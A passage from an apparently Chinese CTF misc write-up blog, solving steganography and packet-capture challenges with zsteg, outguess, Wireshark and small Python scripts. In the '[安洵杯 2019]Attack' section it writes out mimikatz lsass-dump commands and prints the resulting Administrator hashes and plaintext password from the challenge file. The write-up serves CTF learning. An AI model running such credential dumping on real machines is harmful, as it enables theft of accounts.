alt="image-20210530135639553"></p><p><code>flag&#123;Do_u_kN0w_nbt?&#125;</code></p><h3 id="buu、-WUSTCTF2020-爬"><a href="#buu、-WUSTCTF2020-爬" class="headerlink" title="buu、[WUSTCTF2020]爬"></a>buu、[WUSTCTF2020]爬</h3><p><strong>TAG:pdf隐写</strong></p><p>使用一般的txt浏览器看一眼是pdf的文件格式，直接把后缀名改为pdf，要修改pdf，这里找了很多pdf的编辑器都是没法使用，要会员什么的，这里用的是福昕pdf编辑器，虽然需要会员才可以保存，但是不需要会员就能编辑。这里我们只需要编辑的功能就可以了。</p><p><img src="/2021/05/28/CTF/image-20210803190718182.png" alt></p><p><img src="/2021/05/28/CTF/image-20210803190759861.png" alt></p><pre class="line-numbers language-none"><code class="language-none">0x77637466323032307b746831735f31735f405f7064665f616e645f7930755f63616e5f7573655f70686f7430736830707dwctf2020&#123;th1s_1s_@_pdf_and_y0u_can_use_phot0sh0p&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="文件内容隐藏"><a href="#文件内容隐藏" class="headerlink" title="文件内容隐藏"></a>文件内容隐藏</h2><p>这个一般是图片内部加入一些东西，ctf常见题型之一，其类型可能应归属于图片隐写。</p><h3 id="尾部藏文本"><a href="#尾部藏文本" class="headerlink" title="尾部藏文本"></a>尾部藏文本</h3><h4 id="unicode编码-BugKu、这是一张单纯的图片"><a href="#unicode编码-BugKu、这是一张单纯的图片" class="headerlink" title="unicode编码-BugKu、这是一张单纯的图片"></a>unicode编码-BugKu、这是一张单纯的图片</h4><p>是最简单的隐写题类型，直接在文件的尾部发现下面的内容</p><pre class="line-numbers language-none"><code class="language-none">&amp;#107;&amp;#101;&amp;#121;&amp;#123;&amp;#121;&amp;#111;&amp;#117;&amp;#32;&amp;#97;&amp;#114;&amp;#101;&amp;#32;&amp;#114;&amp;#105;&amp;#103;&amp;#104;&amp;#116;&amp;#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个内容一看就是unicode啊，再看都小于0xff，那就可以转ASCII码了，直接上拿手python</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">'&amp;#107;&amp;#101;&amp;#121;&amp;#123;&amp;#121;&amp;#111;&amp;#117;&amp;#32;&amp;#97;&amp;#114;&amp;#101;&amp;#32;&amp;#114;&amp;#105;&amp;#103;&amp;#104;&amp;#116;&amp;#125;'</span>res1 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">';&amp;#'</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> res1<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token comment"># key&#123;you are right&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Unicode特征<code>&amp;#&#123;&#125;;</code>，大括号内的内容是数字。</p><h3 id="尾部藏文件"><a href="#尾部藏文件" class="headerlink" title="尾部藏文件"></a>尾部藏文件</h3><h4 id="outguess隐写、alison-likes-jojo"><a href="#outguess隐写、alison-likes-jojo" class="headerlink" title="outguess隐写、alison_likes_jojo"></a>outguess隐写、alison_likes_jojo</h4><p>没啥好说的，压缩包解压之后是两张图片，图片尾部发现zip文件的文件头<code>pk</code>，直接在winhex里面复制粘贴为zip文件后是个真加密的zip，爆破得口令为<code>888866</code>，解压这个压缩包得到内容</p><pre class="line-numbers language-data" data-language="data"><code class="language-data">WVRKc2MySkhWbmxqV0Zac1dsYzBQUT09<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>三次解base64之后得到后面的jpg文件的outguess隐写的key为</p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">killerqueen<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>需要再对后面的jpg进行outguess，命令为</p><pre class="line-numbers language-command" data-language="command"><code class="language-command">outguess -k &#39;killerqueen&#39; -r &#39;jljy.jpg&#39; flag.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210601141030631.png" alt="image-20210601141030631"></p><p>得到flag</p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">wctf2020&#123;pretty_girl_alison_likes_jojo&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h2><h3 id="修改PNG图片的宽高隐写"><a href="#修改PNG图片的宽高隐写" class="headerlink" title="修改PNG图片的宽高隐写"></a>修改PNG图片的宽高隐写</h3><h4 id="BugKu、隐写"><a href="#BugKu、隐写" class="headerlink" title="BugKu、隐写"></a>BugKu、隐写</h4><p>开局给了一张png图片，拖入winhex改宽高即可。</p><p>先查看文件的详细信息，找到图片的分辨率为<code>500 x 420</code>转成十六进制也就是<code>01F4 x 01A4</code>，在winhex中找到高度宽度位，修改高度位<code>01A4</code>为<code>02A4</code></p><p><img src="/2021/05/28/CTF/image-20210530143746251.png" alt="image-20210530143746251"></p><p><code>BUGKU&#123;a1e5aSA&#125;</code></p><h3 id="PNGの求得图片正确宽高"><a href="#PNGの求得图片正确宽高" class="headerlink" title="PNGの求得图片正确宽高"></a>PNGの求得图片正确宽高</h3><p>脚本如下</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> binascii<span class="token keyword">import</span> structcrcbp <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"xxx.png"</span><span class="token punctuation">,</span> <span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">#打开图片</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> crcbp<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">:</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> \            struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'>i'</span><span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token operator">+</span>struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">'>i'</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token operator">+</span>crcbp<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">:</span><span class="token number">29</span><span class="token punctuation">]</span>        crc32 <span class="token operator">=</span> binascii<span class="token punctuation">.</span>crc32<span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xffffffff</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>crc32 <span class="token operator">==</span> <span class="token number">0x38162a34</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment">#图片当前CRC</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'hex:'</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="PNGのLSB最低位"><a href="#PNGのLSB最低位" class="headerlink" title="PNGのLSB最低位"></a>PNGのLSB最低位</h3><p>一般使用zsteg &amp;&amp; stegsolve &amp;&amp; python脚本解</p><pre class="line-numbers language-none"><code class="language-none"># zsteg使用方法zsteg test.png# 将内容分离到文件zsteg test.png -E &quot;b1,rgb,lsb,xy&quot; &gt; 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="SUCTF-2019-Game"><a href="#SUCTF-2019-Game" class="headerlink" title="[SUCTF 2019]Game"></a>[SUCTF 2019]Game</h4><p><strong>TAG:zsteg使用、html、base64</strong></p><p>题目给的附件是两个文件，一个图片，一个有个html的src源代码文件，vscode打开html，发现</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">echo</span> <span class="token double-quoted-string string">"here is your flag:ON2WG5DGPNUECSDBNBQV6RTBNMZV6RRRMFTX2==="</span> <span class="token delimiter important">?></span></span>suctf&#123;hAHaha_Fak3_F1ag&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>然后就是那个图片了，png考虑lsb，使用zsteg工具，</p><pre class="line-numbers language-none"><code class="language-none">┌──(m4xlmum㉿DESKTOP-MQAVU95)-[&#x2F;mnt&#x2F;c&#x2F;Users&#x2F;Administrator&#x2F;Desktop&#x2F;month&#x2F;6月ctf题目&#x2F;buuoj&#x2F;misc&#x2F;[SUCTF 2019]Game]└─$ zsteg iZwz9i9xnerwj6o7h40eauZ.pngimagedata           .. text: &quot;*,+555\n\n\n&quot;b1,r,lsb,xy         .. text: &quot;4QPz1&#123;wS?[P&quot;b1,rgb,lsb,xy       .. file: openssl enc&#39;d data with salted password, base64 encodedb2,r,lsb,xy         .. file: 0420 Alliant virtual executable common library not strippedb3,r,lsb,xy         .. file: StarOffice Gallery theme \375\245N\333PNO\376\3017\026\003\360D\0055%\226Y$\237\3738\020\331\247\226\377-\226\331\177\004\020\233, 50397955 objects, 1st \001b3,b,lsb,xy         .. text: &quot;Yx(7TRIc&quot;b4,r,lsb,xy         .. text: &quot;gwfE#UU #Dwvh&quot;b4,r,msb,xy         .. text: [&quot;\&quot;&quot; repeated 8 times]b4,g,lsb,xy         .. text: &quot;vwvETgfRDw&quot;b4,g,msb,xy         .. text: &quot;!!ffffffff&quot;b4,b,lsb,xy         .. text: &quot;#EDEUEUEEx&quot;b4,b,msb,xy         .. text: &quot;!!ffffffff&quot;b4,rgb,lsb,xy       .. text: &quot;i%p$$sFG&quot;b4,bgr,lsb,xy       .. text: &quot;Yeu$ t&amp;C&quot;┌──(m4xlmum㉿DESKTOP-MQAVU95)-[&#x2F;mnt&#x2F;c&#x2F;Users&#x2F;Administrator&#x2F;Desktop&#x2F;month&#x2F;6月ctf题目&#x2F;buuoj&#x2F;misc&#x2F;[SUCTF 2019]Game]└─$ zsteg iZwz9i9xnerwj6o7h40eauZ.png -E &quot;b1,rgb,lsb,xy&quot; &gt; 1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>出来的<code>1.txt</code>文件的头部发现分组加密的内容</p><p><img src="/2021/05/28/CTF/image-20210606153006340.png" alt></p><pre class="line-numbers language-none"><code class="language-none">U2FsdGVkX1+zHjSBeYPtWQVSwXzcVFZLu6Qm0To&#x2F;KeuHg8vKAxFrVQ&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以前面解得的fake flag作为密钥，解3DES可得flag</p><pre class="line-numbers language-none"><code class="language-none">suctf&#123;U_F0und_1t&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210606153135261.png" alt></p><h3 id="base64隐写"><a href="#base64隐写" class="headerlink" title="base64隐写"></a>base64隐写</h3><h4 id="python2脚本"><a href="#python2脚本" class="headerlink" title="python2脚本"></a>python2脚本</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># python2.7</span><span class="token keyword">def</span> <span class="token function">get_base64_diff_value</span><span class="token punctuation">(</span>s1<span class="token punctuation">,</span> s2<span class="token punctuation">)</span><span class="token punctuation">:</span>    base64chars <span class="token operator">=</span> <span class="token string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span>    res <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">!=</span> s2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>base64chars<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s1<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> base64chars<span class="token punctuation">.</span>index<span class="token punctuation">(</span>s2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token keyword">def</span> <span class="token function">solve_stego</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'output.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>        file_lines <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>        bin_str <span class="token operator">=</span> <span class="token string">''</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> file_lines<span class="token punctuation">:</span>            steg_line <span class="token operator">=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>            norm_line <span class="token operator">=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>            diff <span class="token operator">=</span> get_base64_diff_value<span class="token punctuation">(</span>steg_line<span class="token punctuation">,</span> norm_line<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>diff<span class="token punctuation">)</span>            pads_num <span class="token operator">=</span> steg_line<span class="token punctuation">.</span>count<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> diff<span class="token punctuation">:</span>                bin_str <span class="token operator">+=</span> <span class="token builtin">bin</span><span class="token punctuation">(</span>diff<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>zfill<span class="token punctuation">(</span>pads_num <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                bin_str <span class="token operator">+=</span> <span class="token string">'0'</span> <span class="token operator">*</span> pads_num <span class="token operator">*</span> <span class="token number">2</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>goflag<span class="token punctuation">(</span>bin_str<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">goflag</span><span class="token punctuation">(</span>bin_str<span class="token punctuation">)</span><span class="token punctuation">:</span>    res_str <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">xrange</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>bin_str<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        res_str <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>bin_str<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res_str<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    solve_stego<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h2><h3 id="Telnet流量分析"><a href="#Telnet流量分析" class="headerlink" title="Telnet流量分析"></a>Telnet流量分析</h3><h4 id="Bugku、telnet"><a href="#Bugku、telnet" class="headerlink" title="Bugku、telnet"></a>Bugku、telnet</h4><p>给的流量包拖入wireshark打开跟踪流直接跟踪一段TCP流发现flag</p><p><img src="/2021/05/28/CTF/image-20210530145908225.png" alt="image-20210530145908225"></p><p><code>flag&#123;d316759c281bf925d600be698a4973d5&#125;</code></p><h3 id="http流量分析"><a href="#http流量分析" class="headerlink" title="http流量分析"></a>http流量分析</h3><h4 id="buu、百里挑一"><a href="#buu、百里挑一" class="headerlink" title="buu、百里挑一"></a>buu、百里挑一</h4><p>首先打开wireshark查看一下有什么数据都</p><p><img src="/2021/05/28/CTF/image-20210601230943606.png" alt="image-20210601230943606"></p><p>一看流量包瞬间明白出题人什么意思了，这是让从100多张图片里面选出来包含信息的那个啊，直接导出http对象。。。没啥用</p><p>用<code>exiftool *</code>，发现半拉flag。</p><p><img src="/2021/05/28/CTF/image-20210601232818680.png" alt="image-20210601232818680"></p><p><code>恭喜你！找到一半了，还有另一半哦！flag&#123;ae58d0408e26e8f</code>，另一半在wireshark里面<code>TCP流 114</code>，这里可以一个一个看，应该没啥简单的方法了。</p><p><img src="/2021/05/28/CTF/image-20210601233334032.png" alt="image-20210601233334032"></p><p><code>26a3c0589d23edeec&#125;</code></p><p><code>flag&#123;ae58d0408e26e8f26a3c0589d23edeec&#125;</code></p><h4 id="安洵杯-2019-Attack"><a href="#安洵杯-2019-Attack" class="headerlink" title="[安洵杯 2019]Attack"></a>[安洵杯 2019]Attack</h4><p>wireshark打开文件，稍微一追踪tcp流就知道这是某嗨客拿工具在扫目录，直接向后跳，到大约<code>819条数据</code>开始出现有用的数据，第824条数据出现关键字<code>flag.txt</code>，还有pk，应该是flag在压缩包里面，压缩包被嗨客下载下来了，导出所有http对象。但是里面并没有发现zip文件，只好使用foremost再分离一下。</p><p><img src="/2021/05/28/CTF/image-20210606114640134.png" alt></p><p>想起刚才导出http对象时有一个lsass文件，最近学域渗透恰巧知道了这个是windows里面存放开机口令的文件，可使用mimikatz来解析。</p><pre class="line-numbers language-none"><code class="language-none">sekurlsa::minidump lsass.dmpsekurlsa::logonPasswords full<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>得</p><pre class="line-numbers language-none"><code class="language-none">Authentication Id : 0 ; 347784 (00000000:00054e88)Session           : Interactive from 1User Name         : AdministratorDomain            : WIN7Logon Server      : WIN7Logon Time        : 2019&#x2F;11&#x2F;14 9:38:33SID               : S-1-5-21-1539156736-1959120456-2224594862-500        msv :         [00000003] Primary         * Username : Administrator         * Domain   : WIN7         * LM       : c4d0515fb12046a475113b7737dc0019         * NTLM     : aafdad330f5a9f4fbf562ed3d25f97de         * SHA1     : 8b9a7ca86970d1392b6fa0b94b8694c2b919469f        tspkg :         * Username : Administrator         * Domain   : WIN7         * Password : W3lc0meToD0g3        wdigest :         * Username : Administrator         * Domain   : WIN7         * Password : W3lc0meToD0g3        kerberos :         * Username : Administrator         * Domain   : WIN7         * Password : W3lc0meToD0g3        ssp :        credman :Authentication Id : 0 ; 997 (00000000:000003e5)Session           : Service from 0User Name         : LOCAL SERVICEDomain            : NT AUTHORITYLogon Server      : (null)Logon Time        : 2019&#x2F;11&#x2F;14 9:35:06SID               : S-1-5-19        msv :        tspkg :        wdigest :         * Username : (null)         * Domain   : (null)         * Password : (null)        kerberos :         * Username : (null)         * Domain   : (null)         * Password : (null)        ssp :        credman :Authentication Id : 0 ; 996 (00000000:000003e4)Session           : Service from 0User Name         : WIN7$Domain            : WORKGROUPLogon Server      : (null)Logon Time        : 2019&#x2F;11&#x2F;14 9:35:06SID               : S-1-5-20        msv :        tspkg :        wdigest :         * Username : WIN7$         * Domain   : WORKGROUP         * Password : (null)        kerberos :         * Username : win7$         * Domain   : WORKGROUP         * Password : (null)        ssp :        credman :Authentication Id : 0 ; 48847 (00000000:0000becf)Session           : UndefinedLogonType from 0User Name         : (null)Domain            : (null)Logon Server      : (null)Logon Time        : 2019&#x2F;11&#x2F;14 9:35:04SID               :        msv :        tspkg :        wdigest :        kerberos :        ssp :        credman :Authentication Id : 0 ; 999 (00000000:000003e7)Session           : UndefinedLogonType from 0User Name         : WIN7$Domain            : WORKGROUPLogon Server      : (null)Logon Time        : 2019&#x2F;11&#x2F;14 9:35:04SID               : S-1-5-18        msv :        tspkg :        wdigest :         * Username : WIN7$         * Domain   : WORKGROUP         * Password : (null)        kerberos :         * Username : win7$         * Domain   : WORKGROUP         * Password : (null)        ssp :        credman :mimikatz #<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>解一下压缩包得flag(口令为<code>W3lc0meToD0g3</code>)</p><pre class="line-numbers language-none"><code class="language-none">D0g3&#123;3466b11de8894198af3636c5bd1efce2&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="SUCTF2018-followme"><a href="#SUCTF2018-followme" class="headerlink" title="[SUCTF2018]followme"></a>[SUCTF2018]followme</h4><p>先导出http的对象，直接save all即可，注意到这是对密码有一个爆破的操作，一个文件一个文件地打开发现flag</p><p><img src="/2021/05/28/CTF/image-20210804183639765.png" alt></p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">SUCTF&#123;password_is_not_weak&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="USB流量分析"><a href="#USB流量分析" class="headerlink" title="USB流量分析"></a>USB流量分析</h3><p>这个有个大佬写的比较方便的脚本</p><p><strong><a href="https://github.com/WangYihang/UsbKeyboardDataHacker">UsbKeyboardDataHacker</a></strong></p><h4 id="BUUCTF、USB"><a href="#BUUCTF、USB" class="headerlink" title="BUUCTF、USB"></a>BUUCTF、USB</h4><p>题目给出了个rar文件还有个ftm的文件，将ftm文件用binwalk分离出key.pcap流量包，打开之后确实是usb的流量</p><p><img src="/2021/05/28/CTF/image-20210803235852673.png" alt></p><p>那就直接那脚本梭了。</p><p><img src="/2021/05/28/CTF/image-20210804000444335.png" alt></p><p>得到的内容为</p><pre class="line-numbers language-none"><code class="language-none">aababacbbdbdccccdcdcdbbcccbcbbcbbaababaaaaaaaaaaaaaaaaaakey&#123;xinan&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    然后看<code>233.rar</code>这个文件，文件内压缩有一个小文件但是这个文件很大，肯定是格式错误导致第二个文件没有显示出来，用010editor打开提示第三个rar块里面有crc错误，对比其他的块发现错了一个字节，改正即可<code>7A =&gt; 74</code>。</p><p>​    后又得到一个png的文件，stegsolve打开之后在蓝色0通道发现一张二维码</p><p><img src="/2021/05/28/CTF/image-20210804174032957.png" alt=" "></p><pre class="line-numbers language-none"><code class="language-none">ci&#123;v3erf_0tygidv2_fc0&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结合上面的key进行维吉尼亚解密</p><p><img src="/2021/05/28/CTF/image-20210804175251645.png" alt></p><pre class="line-numbers language-none"><code class="language-none">fa&#123;i3eei_0llgvgn2_sc0&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210804175346375.png" alt></p><pre class="line-numbers language-none"><code class="language-none">&#x3D;&gt;栅栏密码flag&#123;vig3ne2e_is_c00l&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="特殊数据"><a href="#特殊数据" class="headerlink" title="特殊数据"></a>特殊数据</h3><h4 id="蜘蛛侠呀"><a href="#蜘蛛侠呀" class="headerlink" title="蜘蛛侠呀"></a>蜘蛛侠呀</h4><p>每段icmp数据后面都跟着有一些有用处的数据，使用tshark命令将其分离出来</p><pre class="line-numbers language-none"><code class="language-none">tshark -r out.pcap -T fields -e data &gt; data.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后写个脚本处理一下数据</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytes<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'data.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>data1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> tmp <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>        <span class="token keyword">continue</span>    data1<span class="token punctuation">.</span>append<span class="token punctuation">(</span>long_to_bytes<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'0x'</span> <span class="token operator">+</span> tmp<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>data <span class="token operator">=</span> data1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">]</span>content <span class="token operator">=</span> <span class="token string">b''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    content <span class="token operator">+=</span> base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'out.zip'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    <span class="token builtin">file</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span aria-hidden="true" 